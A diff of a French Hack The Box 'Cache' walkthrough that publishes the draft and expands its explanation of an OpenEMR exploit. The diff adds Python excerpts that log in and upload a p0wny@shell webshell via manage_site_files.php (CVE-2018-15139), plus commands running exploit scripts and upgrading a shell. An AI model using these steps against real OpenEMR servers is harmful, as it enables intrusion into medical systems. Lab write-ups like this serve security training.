@@ -7,15 +7,15 @@
 title: "Cache — HTB Medium Writeup & Walkthrough"
 linkTitle: "Cache"
 slug: "cache"
-date: 2026-07-25T09:44:04+02:00
+date: 2026-09-17T10:00:00+02:00
 #lastmod: 2026-07-25T09:44:04+02:00
-draft: true
+draft: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
 summary: "Cache (HTB Medium) : OpenEMR, réutilisation d’identifiants, Memcached et escalade de privilèges via Docker."
 description: "Writeup de Cache (HTB Medium) : découverte d’OpenEMR, exploitation web, réutilisation d’identifiants, Memcached et escalade via Docker."
-tags: ["Hack The Box","HTB Medium","OpenEMR","Burp Suite","RCE","Credential Reuse","Memcached","Docker","linux-privesc"]
+tags: ["Hack The Box","HTB Medium","OpenEMR","RCE","Burp Suite","Credential Reuse","Memcached","Docker","linux-privesc"]
 categories: ["Mes writeups"]
 
 # Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
@@ -517,7 +517,7 @@ Tu cliques ensuite sur le lien `jquery/functionality.js` pour afficher le conten
 <script src="jquery/functionality.js"></script>
 ```
 
-Depuis le code source de `login.html`, tu cliques sur le lien `jquery/functionality.js` pour afficher le contenu du script.
+Voici le résultat :
 
 ![Recherche dans le fichier functionality.js](cache-htb-query-functionality-js-source.png)
 
@@ -1031,7 +1031,7 @@ python3 50017.py \
   -P 80 \
   -U '' \
   -R '/portal/add_edit_event_user.php' \
-  | tee 50017/add_edit_event_user.txt
+  | tee add_edit_event_user.txt
 ```
 
 L’option `-U ''` indique que l’installation OpenEMR est directement accessible à la racine de `hms.htb`.
@@ -1039,7 +1039,7 @@ L’option `-U ''` indique que l’installation OpenEMR est directement accessib
 La réponse est affichée dans le terminal et enregistrée en même temps dans :
 
 ```text
-50017/add_edit_event_user.txt
+add_edit_event_user.txt
 ```
 
 Le script confirme d’abord que la cible est vulnérable :
@@ -1090,7 +1090,7 @@ pages=(
 )
 
 for page in "${pages[@]}"; do
-  output="50017/${page//\//_}"
+  output="${page//\//_}"
   output="${output%.php}.txt"
 
   python3 50017.py \
@@ -1119,20 +1119,20 @@ messaging/messages.php
 est enregistré sous le nom :
 
 ```text
-50017/messaging_messages.txt
+messaging_messages.txt
 ```
 
 Comme la première ressource a déjà révélé la chaîne `Administrator`, tu recherches ce terme dans l’ensemble des fichiers récupérés :
 
 ```bash
-grep -Rni 'administrator' 50017/
+grep -ni 'administrator' *.txt
 ```
 
 La commande retourne :
 
 ```text
-50017/messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
-50017/add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
+messaging_messages.txt:67:    $scope.authrecips = [{"userid":"openemr_admin","username":"Administrator Administrator"}];
+add_edit_event_user.txt:86:    <option value='1'>Administrator, Administrator</option>
 ```
 
 La seconde ligne correspond à l’information déjà observée dans le formulaire de rendez-vous.
@@ -1380,37 +1380,75 @@ cd 49998
 searchsploit -m php/webapps/49998.py
 ```
 
-Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’en comprendre le fonctionnement général et les différentes étapes de l’exploitation :
+Avant de l’exécuter, tu ouvres `49998.py` dans un éditeur de texte afin d’en comprendre le fonctionnement général :
 
 ```bash
 nano 49998.py
 ```
 
-L’en-tête indique que le script exploite la vulnérabilité `CVE-2018-15139`.
+L’en-tête indique que le script exploite la vulnérabilité :
 
-Après s’être authentifié auprès d’OpenEMR avec un compte valide, le script accède à la page suivante :
+```text
+CVE-2018-15139
+```
+
+La description précise qu’il s’agit d’un téléversement de fichier non restreint dans :
 
 ```text
 /interface/super/manage_site_files.php
 ```
 
-Cette page permet normalement de gérer certains fichiers du site OpenEMR. L’exploit détourne cette fonctionnalité pour y déposer une webshell PHP nommée :
+L’exploitation nécessite toutefois un utilisateur OpenEMR authentifié.
 
-```text
-shell.php
+Le script commence donc par construire la requête de connexion :
+
+```python
+auth_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/main/main_screen.php?auth=login&site=default'
+
+body = {
+    'new_login_session_management': '1',
+    'authProvider': 'Default',
+    'authUser': username,
+    'clearPass': password,
+    'languageChoice': '1'
+}
+
+auth = session.post(auth_url, headers=header, data=body)
 ```
 
-Le script intègre directement une webshell basée sur `p0wny@shell`.
+Tu retrouves ici les mêmes paramètres d’authentification que ceux observés précédemment avec Burp Suite : `authUser` pour le nom d’utilisateur et `clearPass` pour le mot de passe.
+
+Une fois authentifié, le script cible la page vulnérable :
+
+```python
+exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/interface/super/manage_site_files.php'
+```
+
+Il prépare ensuite une requête `multipart/form-data` contenant un fichier PHP nommé `shell.php`. Ce fichier embarque `p0wny@shell`, une interface web permettant d’exécuter des commandes sur le serveur.
+
+La requête est envoyée avec :
+
+```python
+session.post(exploit_url, headers=header, data=body)
+```
+
+Si l’envoi réussit, la webshell devient accessible ici :
+
+```python
+path = 'http://' + target_ip + ':' + target_port + openemr_path + '/sites/default/images/shell.php'
+```
+
+L’exploitation consiste donc à téléverser `shell.php` via `manage_site_files.php`, puis à l’ouvrir dans le navigateur pour exécuter des commandes.
+
+Le fonctionnement général de l’exploit est donc assez simple :
+
+1. s’authentifier auprès d’OpenEMR ;
+2. envoyer `shell.php` via `manage_site_files.php` ;
+3. accéder ensuite à la webshell dans `/sites/default/images/`.
 
 `p0wny@shell` est une webshell PHP légère qui permet d’exécuter des commandes sur le serveur depuis une interface web, avec les privilèges du compte utilisé par le serveur web.
 
-Si l’envoi réussit, la webshell doit être déposée dans le répertoire des images du site OpenEMR et devenir accessible à l’adresse suivante :
-
-```url
-http://hms.htb/sites/default/images/shell.php
-```
-
-Avant de lancer l’exploitation, tu affiches l’aide de `49998.py` afin d’identifier les paramètres attendus :
+Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identifier les paramètres attendus :
 
 ```bash
 python3 49998.py -h
@@ -1610,9 +1648,7 @@ Tu crées d’abord un pseudo-terminal avec Python :
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Tu places ensuite le shell en arrière-plan avec `Ctrl+Z`, puis dans Kali :
-
-Puis, dans le terminal Kali, tu exécutes :
+Tu places ensuite le shell en arrière-plan avec `Ctrl+Z`, puis dans le terminal Kali, tu exécutes :
 
 ```bash
 stty raw -echo
@@ -1718,9 +1754,7 @@ Tu poursuis avec `suid3num.py` afin d’identifier les fichiers possédant le bi
 
 Comme le script se trouve sur Kali, tu le transfères d’abord vers la cible en suivant la recette dédiée :
 
-```text
 {{< recette "copier-fichiers-kali" >}}
-```
 
 Depuis Kali, dans le répertoire contenant `suid3num.py`, tu lances par exemple un serveur HTTP :
 
